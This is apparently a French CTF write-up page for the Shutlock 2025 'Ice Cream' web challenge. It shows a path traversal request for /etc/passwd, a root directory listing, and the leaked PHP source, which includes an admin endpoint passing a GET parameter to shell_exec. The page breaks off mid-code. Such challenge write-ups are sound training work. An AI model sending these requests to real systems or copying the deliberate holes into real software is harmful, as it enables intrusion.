@@ -1,0 +1,385 @@
+
+
+<!DOCTYPE html>
+<html class="writer-html5" lang="fr" data-content_root="../../">
+<head>
+  <meta charset="utf-8" /><meta name="viewport" content="width=device-width, initial-scale=1" />
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Ice Cream &mdash; Documentation Kubow WU 1</title>
+      <link rel="stylesheet" type="text/css" href="../../_static/pygments.css?v=80d5e7a1" />
+      <link rel="stylesheet" type="text/css" href="../../_static/css/theme.css?v=e59714d7" />
+
+  
+      <script src="../../_static/jquery.js?v=5d32c60e"></script>
+      <script src="../../_static/_sphinx_javascript_frameworks_compat.js?v=2cd50e6c"></script>
+      <script src="../../_static/documentation_options.js?v=a12a2fe1"></script>
+      <script src="../../_static/doctools.js?v=9bcbadda"></script>
+      <script src="../../_static/sphinx_highlight.js?v=dc90522c"></script>
+      <script src="../../_static/translations.js?v=e6b791cb"></script>
+    <script src="../../_static/js/theme.js"></script>
+    <link rel="index" title="Index" href="../../genindex.html" />
+    <link rel="search" title="Recherche" href="../../search.html" />
+    <link rel="next" title="Local Terror" href="localterror.html" />
+    <link rel="prev" title="Form Avility" href="formavility.html" /> 
+</head>
+
+<body class="wy-body-for-nav"> 
+  <div class="wy-grid-for-nav">
+    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
+      <div class="wy-side-scroll">
+        <div class="wy-side-nav-search" >
+
+          
+          
+          <a href="../../index.html" class="icon icon-home">
+            Kubow WU
+          </a>
+<div role="search">
+  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
+    <input type="text" name="q" placeholder="Rechercher docs" aria-label="Rechercher docs" />
+    <input type="hidden" name="check_keywords" value="yes" />
+    <input type="hidden" name="area" value="default" />
+  </form>
+</div>
+        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
+              <p class="caption" role="heading"><span class="caption-text">Liste des CTFs :</span></p>
+<ul class="current">
+<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2024/_index.html">Midnight Flag 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../midnightflag-2025/_index.html">Midnight Flag 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2024/_index.html">404CTF 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../404ctf-2025/_index.html">404CTF 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../HTB-Apocalypse-2025/_index.html">HTB Apocalypse 2024</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../FCSC-2025/_index.html">FCSC 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../DGSE-Root-Me-2025/_index.html">DGSE Root-Me 2025</a></li>
+<li class="toctree-l1"><a class="reference internal" href="../Hackosint-2025/_index.html">Hackosint 2025</a></li>
+<li class="toctree-l1 current"><a class="reference internal" href="_index.html">Shutlock 2025</a><ul class="current">
+<li class="toctree-l2"><a class="reference internal" href="_index.html#story">Story</a></li>
+<li class="toctree-l2 current"><a class="reference internal" href="_index.html#web">Web</a><ul class="current">
+<li class="toctree-l3"><a class="reference internal" href="formavility.html">Form Avility</a></li>
+<li class="toctree-l3 current"><a class="current reference internal" href="#">Ice Cream</a></li>
+<li class="toctree-l3"><a class="reference internal" href="localterror.html">Local Terror</a></li>
+<li class="toctree-l3"><a class="reference internal" href="oldschool.html">Old School Markus</a></li>
+</ul>
+</li>
+<li class="toctree-l2"><a class="reference internal" href="_index.html#osint">Osint</a></li>
+<li class="toctree-l2"><a class="reference internal" href="_index.html#forensic">Forensic</a></li>
+</ul>
+</li>
+</ul>
+
+        </div>
+      </div>
+    </nav>
+
+    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
+          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
+          <a href="../../index.html">Kubow WU</a>
+      </nav>
+
+      <div class="wy-nav-content">
+        <div class="rst-content">
+          <div role="navigation" aria-label="Page navigation">
+  <ul class="wy-breadcrumbs">
+      <li><a href="../../index.html" class="icon icon-home" aria-label="Home"></a></li>
+          <li class="breadcrumb-item"><a href="_index.html">Shutlock 2025</a></li>
+      <li class="breadcrumb-item active">Ice Cream</li>
+      <li class="wy-breadcrumbs-aside">
+            <a href="../../_sources/ctf/shutlock-2025/icecream.rst.txt" rel="nofollow"> Afficher la source de la page</a>
+      </li>
+  </ul>
+  <hr/>
+</div>
+          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
+           <div itemprop="articleBody">
+             
+  <section id="ice-cream">
+<h1>Ice Cream<a class="headerlink" href="#ice-cream" title="Lien vers cette rubrique"></a></h1>
+<p>On a un site web assez simple avec une seule requête et plusieurs argument possible :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://57.128.112.118:10570/?dir=ingredients&amp;file=vanille</span>
+<span class="go">http://57.128.112.118:10570/?dir=ingredients&amp;file=secret</span>
+</pre></div>
+</div>
+<p>Lorsqu’on choisit l’ingrédient secret, celui ci refuse de s’afficher.</p>
+<p>On va d’abord tester /etc/passwd avec une path traversal :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://57.128.112.118:10570/?dir=../../../../../../etc&amp;file=passwd</span>
+<span class="go">==&gt; Access denied</span>
+</pre></div>
+</div>
+<p>On essaie alors simplement avec « / » :</p>
+<div class="highlight-console notranslate"><div class="highlight"><pre><span></span><span class="go">http://57.128.112.118:10570/?dir=/&amp;file=passwd</span>
+
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=admin.php&#39;&quot;&gt;admin.php&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=admin.txt&#39;&quot;&gt;admin.txt&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=auth.php&#39;&quot;&gt;auth.php&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=flavors.db&#39;&quot;&gt;flavors.db&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=index.php&#39;&quot;&gt;index.php&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=ingredients&#39;&quot;&gt;ingredients&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=jwt_secret.txt&#39;&quot;&gt;jwt_secret.txt&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=secrets&#39;&quot;&gt;secrets&lt;/li&gt;</span>
+<span class="go">&lt;li onclick=&quot;location.href=&#39;?dir=%2F&amp;file=styles.css&#39;&quot;&gt;styles.css&lt;/li&gt;&lt;/ul&gt;</span>
+</pre></div>
+</div>
+<p>On peut maintenant lire les différents fichiers :</p>
+<ul class="simple">
+<li><p>admin.php</p></li>
+</ul>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="nv">$canExecute</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
+<span class="nv">$secret</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;jwt_secret.txt&#39;</span><span class="p">));</span>
+
+<span class="nv">$adminToken</span> <span class="o">=</span> <span class="nb">trim</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="s1">&#39;admin.txt&#39;</span><span class="p">));</span>
+
+<span class="k">function</span> <span class="nf">base64url_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">rtrim</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nb">base64_encode</span><span class="p">(</span><span class="nv">$data</span><span class="p">),</span> <span class="s1">&#39;+/&#39;</span><span class="p">,</span> <span class="s1">&#39;-_&#39;</span><span class="p">),</span> <span class="s1">&#39;=&#39;</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">base64url_decode</span><span class="p">(</span><span class="nv">$data</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">return</span> <span class="nb">base64_decode</span><span class="p">(</span><span class="nb">strtr</span><span class="p">(</span><span class="nv">$data</span><span class="p">,</span> <span class="s1">&#39;-_&#39;</span><span class="p">,</span> <span class="s1">&#39;+/&#39;</span><span class="p">));</span>
+<span class="p">}</span>
+
+<span class="k">function</span> <span class="nf">verify_jwt_hs256</span><span class="p">(</span><span class="nv">$jwt</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$parts</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s1">&#39;.&#39;</span><span class="p">,</span> <span class="nv">$jwt</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="nb">count</span><span class="p">(</span><span class="nv">$parts</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">3</span><span class="p">)</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+
+    <span class="k">list</span><span class="p">(</span><span class="nv">$header_b64</span><span class="p">,</span> <span class="nv">$payload_b64</span><span class="p">,</span> <span class="nv">$sig_b64</span><span class="p">)</span> <span class="o">=</span> <span class="nv">$parts</span><span class="p">;</span>
+    <span class="nv">$expected_sig</span> <span class="o">=</span> <span class="nx">base64url_encode</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$header_b64</span><span class="s2">.</span><span class="si">$payload_b64</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">,</span> <span class="k">true</span><span class="p">));</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">hash_equals</span><span class="p">(</span><span class="nv">$expected_sig</span><span class="p">,</span> <span class="nv">$sig_b64</span><span class="p">))</span> <span class="k">return</span> <span class="k">false</span><span class="p">;</span>
+
+    <span class="k">return</span> <span class="nb">json_decode</span><span class="p">(</span><span class="nx">base64url_decode</span><span class="p">(</span><span class="nv">$payload_b64</span><span class="p">),</span> <span class="k">true</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="nv">$adminToken</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nv">$canExecute</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+    <span class="nv">$header</span> <span class="o">=</span> <span class="nx">base64url_encode</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">([</span><span class="s1">&#39;alg&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;HS256&#39;</span><span class="p">,</span> <span class="s1">&#39;typ&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;JWT&#39;</span><span class="p">]));</span>
+    <span class="nv">$payload</span> <span class="o">=</span> <span class="nx">base64url_encode</span><span class="p">(</span><span class="nb">json_encode</span><span class="p">([</span><span class="s1">&#39;role&#39;</span> <span class="o">=&gt;</span> <span class="s1">&#39;simple-utilisateur&#39;</span><span class="p">]));</span>
+    <span class="nv">$signature</span> <span class="o">=</span> <span class="nx">base64url_encode</span><span class="p">(</span><span class="nb">hash_hmac</span><span class="p">(</span><span class="s1">&#39;sha256&#39;</span><span class="p">,</span> <span class="s2">&quot;</span><span class="si">$header</span><span class="s2">.</span><span class="si">$payload</span><span class="s2">&quot;</span><span class="p">,</span> <span class="nv">$secret</span><span class="p">,</span> <span class="k">true</span><span class="p">));</span>
+
+    <span class="nv">$jwt</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="si">$header</span><span class="s2">.</span><span class="si">$payload</span><span class="s2">.</span><span class="si">$signature</span><span class="s2">&quot;</span><span class="p">;</span>
+
+    <span class="nb">setcookie</span><span class="p">(</span><span class="s1">&#39;auth&#39;</span><span class="p">,</span> <span class="nv">$jwt</span><span class="p">,</span> <span class="nb">time</span><span class="p">()</span> <span class="o">+</span> <span class="mi">3600</span><span class="p">,</span> <span class="s2">&quot;/&quot;</span><span class="p">);</span>
+    <span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;auth&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$jwt</span><span class="p">;</span>
+<span class="p">}</span>
+
+<span class="k">if</span> <span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">&#39;REQUEST_METHOD&#39;</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;GET&#39;</span> <span class="o">&amp;&amp;</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">]))</span> <span class="p">{</span>
+    <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$canExecute</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Tu ne peux pas executer de commandes avec debug tant que tu n&#39;es pas authentifié en tant qu&#39;admin&lt;/p&gt;&quot;</span><span class="p">;</span>
+        <span class="k">exit</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="nv">$cmd</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;debug&#39;</span><span class="p">];</span>
+    <span class="nv">$output</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="nv">$cmd</span><span class="p">);</span>
+    <span class="k">echo</span> <span class="s2">&quot;&lt;pre&gt;</span><span class="si">$output</span><span class="s2">&lt;/pre&gt;&quot;</span><span class="p">;</span>
+    <span class="k">exit</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="cp">?&gt;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>auth.php</p></li>
+</ul>
+<div class="highlight-HTML notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;!DOCTYPE html&gt;</span>
+<span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&quot;en&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&quot;UTF-8&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;viewport&quot;</span> <span class="na">content</span><span class="o">=</span><span class="s">&quot;width=device-width, initial-scale=1.0&quot;</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>&#39;auth&#39; cookie recherche<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">link</span> <span class="na">rel</span><span class="o">=</span><span class="s">&quot;stylesheet&quot;</span> <span class="na">href</span><span class="o">=</span><span class="s">&quot;styles.css&quot;</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+<span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;header-container&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">h1</span><span class="p">&gt;</span>EN COURS DE DEVELOPPEMENT NE PAS UTILISER (signé le stagiaire)<span class="p">&lt;/</span><span class="nt">h1</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>La table &#39;auth&#39; permettra de rechercher tous les types d&#39;utilisateurs pour la future authentification<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">p</span><span class="p">&gt;</span>example : simple-utilisateur<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+
+    <span class="p">&lt;</span><span class="nt">div</span> <span class="na">class</span><span class="o">=</span><span class="s">&quot;form-container&quot;</span><span class="p">&gt;</span>
+        <span class="p">&lt;</span><span class="nt">form</span> <span class="na">action</span><span class="o">=</span><span class="s">&quot;&quot;</span> <span class="na">method</span><span class="o">=</span><span class="s">&quot;POST&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">label</span> <span class="na">for</span><span class="o">=</span><span class="s">&quot;ingredient&quot;</span><span class="p">&gt;</span>Type d&#39;utilisateur:<span class="p">&lt;/</span><span class="nt">label</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">input</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;text&quot;</span> <span class="na">id</span><span class="o">=</span><span class="s">&quot;ingredient&quot;</span> <span class="na">name</span><span class="o">=</span><span class="s">&quot;ingredient&quot;</span> <span class="na">placeholder</span><span class="o">=</span><span class="s">&quot;Type d&#39;auth&quot;</span><span class="p">&gt;</span>
+            <span class="p">&lt;</span><span class="nt">button</span> <span class="na">type</span><span class="o">=</span><span class="s">&quot;submit&quot;</span><span class="p">&gt;</span>Recherche<span class="p">&lt;/</span><span class="nt">button</span><span class="p">&gt;</span>
+        <span class="p">&lt;/</span><span class="nt">form</span><span class="p">&gt;</span>
+    <span class="p">&lt;/</span><span class="nt">div</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+<span class="p">&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
+</pre></div>
+</div>
+<ul class="simple">
+<li><p>index.php</p></li>
+</ul>
+<div class="highlight-php notranslate"><div class="highlight"><pre><span></span><span class="cp">&lt;?php</span>
+<span class="k">include_once</span><span class="p">(</span><span class="s1">&#39;admin.php&#39;</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+<span class="x">&lt;!DOCTYPE html&gt;</span>
+<span class="x">&lt;html lang=&quot;en&quot;&gt;</span>
+<span class="x">&lt;head&gt;</span>
+<span class="x">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span>
+<span class="x">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span>
+<span class="x">    &lt;title&gt;Ice Cream Ingredients&lt;/title&gt;</span>
+<span class="x">    &lt;link rel=&quot;stylesheet&quot; href=&quot;styles.css&quot;&gt;</span>
+<span class="x">&lt;/head&gt;</span>
+<span class="x">&lt;body&gt;</span>
+<span class="x">&lt;div class=&quot;header-container&quot;&gt;</span>
+<span class="x">    &lt;h1 class=&quot;main-title&quot;&gt;PAPI GLACE, l&#39;expert des glaces 3 boules&lt;/h1&gt;</span>
+<span class="x">    &lt;h2 class=&quot;subtitle&quot;&gt;Découvrez tous les ingrédients exceptionnels qui font de nous le vendeur de glace numéro 1 à Cannes avec notre iconique glace a 3 boules&lt;/h2&gt;</span>
+<span class="x">&lt;/div&gt;</span>
+
+<span class="x">&lt;div class=&quot;layout&quot;&gt;</span>
+<span class="x">    &lt;div class=&quot;container&quot; id=&quot;ingredients&quot;&gt;</span>
+<span class="x">        </span><span class="cp">&lt;?php</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">])</span> <span class="o">===</span> <span class="s1">&#39;auth.php&#39;</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">include</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/auth.php&#39;</span><span class="p">);</span>
+            <span class="k">exit</span><span class="p">;</span>
+        <span class="p">}</span>
+
+        <span class="nv">$projectRoot</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="no">__DIR__</span><span class="p">);</span>
+        <span class="nv">$ingredientsDir</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/ingredients&#39;</span><span class="p">);</span>
+        <span class="nv">$requestedDir</span> <span class="o">=</span> <span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;dir&#39;</span><span class="p">]</span> <span class="o">:</span> <span class="s1">&#39;ingredients&#39;</span><span class="p">;</span>
+        <span class="nv">$path</span> <span class="o">=</span> <span class="nb">realpath</span><span class="p">(</span><span class="nv">$projectRoot</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$requestedDir</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nv">$path</span> <span class="o">===</span> <span class="k">false</span> <span class="o">||</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$path</span><span class="p">,</span> <span class="nv">$projectRoot</span><span class="p">)</span> <span class="o">!==</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span>
+            <span class="k">die</span><span class="p">(</span><span class="s2">&quot;Access denied.&quot;</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$path</span><span class="p">))</span> <span class="p">{</span>
+            <span class="nv">$displayPath</span> <span class="o">=</span> <span class="nv">$path</span> <span class="o">===</span> <span class="nv">$ingredientsDir</span> <span class="o">?</span> <span class="s1">&#39;/&#39;</span> <span class="o">:</span> <span class="nb">str_replace</span><span class="p">(</span><span class="nv">$projectRoot</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$path</span><span class="p">);</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;h1&gt;Nos ingedients pour une glace comme fait notre papi: &lt;/h1&gt;&quot;</span><span class="p">;</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;ul&gt;&quot;</span><span class="p">;</span>
+
+            <span class="nv">$files</span> <span class="o">=</span> <span class="nb">scandir</span><span class="p">(</span><span class="nv">$path</span><span class="p">);</span>
+            <span class="k">foreach</span> <span class="p">(</span><span class="nv">$files</span> <span class="k">as</span> <span class="nv">$file</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nv">$file</span> <span class="o">===</span> <span class="s1">&#39;.&#39;</span> <span class="o">||</span> <span class="nv">$file</span> <span class="o">===</span> <span class="s1">&#39;..&#39;</span> <span class="o">||</span> <span class="nv">$file</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">===</span> <span class="s1">&#39;.&#39;</span><span class="p">)</span> <span class="k">continue</span><span class="p">;</span>
+
+                <span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$path</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+                <span class="nv">$fileUrl</span> <span class="o">=</span> <span class="nv">$requestedDir</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$file</span><span class="p">;</span>
+
+                <span class="k">if</span> <span class="p">(</span><span class="nb">is_dir</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="nv">$url</span> <span class="o">=</span> <span class="s2">&quot;?dir=&quot;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nb">trim</span><span class="p">(</span><span class="nv">$fileUrl</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">));</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;li onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$url</span> <span class="o">.</span> <span class="s2">&quot;&#39;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/li&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nv">$url</span> <span class="o">=</span> <span class="s2">&quot;?dir=&quot;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$requestedDir</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&amp;file=&quot;</span> <span class="o">.</span> <span class="nb">urlencode</span><span class="p">(</span><span class="nv">$file</span><span class="p">);</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;li onclick=</span><span class="se">\&quot;</span><span class="s2">location.href=&#39;&quot;</span> <span class="o">.</span> <span class="nv">$url</span> <span class="o">.</span> <span class="s2">&quot;&#39;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$file</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;&lt;/li&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;/ul&gt;&quot;</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Dossier d&#39;ingredients invalide.&lt;/p&gt;&quot;</span><span class="p">;</span>
+        <span class="p">}</span>
+        <span class="cp">?&gt;</span>
+<span class="x">    &lt;/div&gt;</span>
+
+<span class="x">    &lt;div class=&quot;content&quot;&gt;</span>
+<span class="x">        </span><span class="cp">&lt;?php</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]))</span> <span class="p">{</span>
+            <span class="nv">$requestedFile</span> <span class="o">=</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">]);</span>
+            <span class="nv">$filePath</span> <span class="o">=</span> <span class="nv">$path</span> <span class="o">.</span> <span class="s1">&#39;/&#39;</span> <span class="o">.</span> <span class="nv">$requestedFile</span><span class="p">;</span>
+
+            <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nb">realpath</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">),</span> <span class="nv">$projectRoot</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                <span class="nv">$mimeType</span> <span class="o">=</span> <span class="nb">mime_content_type</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">);</span>
+                <span class="k">if</span> <span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$mimeType</span><span class="p">,</span> <span class="s1">&#39;image&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Image file&lt;/p&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$requestedFile</span> <span class="o">===</span> <span class="s1">&#39;admin.txt&#39;</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;T&#39;es pas admin je crois nan? &lt;/p&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$requestedFile</span> <span class="o">===</span> <span class="s1">&#39;flavors.db&#39;</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Touche pas à ma db! &lt;/p&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$requestedFile</span> <span class="o">===</span> <span class="s1">&#39;jwt_secret.txt&#39;</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;p&gt;Pas touche! &lt;/p&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span>
+                <span class="k">else</span> <span class="p">{</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;h2&gt;Notre &quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$requestedFile</span><span class="p">)</span> <span class="o">.</span> <span class="s2">&quot;:&lt;/h2&gt;&quot;</span><span class="p">;</span>
+                    <span class="k">echo</span> <span class="s2">&quot;&lt;div class=&#39;content-box&#39;&gt;&quot;</span> <span class="o">.</span> <span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$filePath</span><span class="p">))</span> <span class="o">.</span> <span class="s2">&quot;&lt;/div&gt;&quot;</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
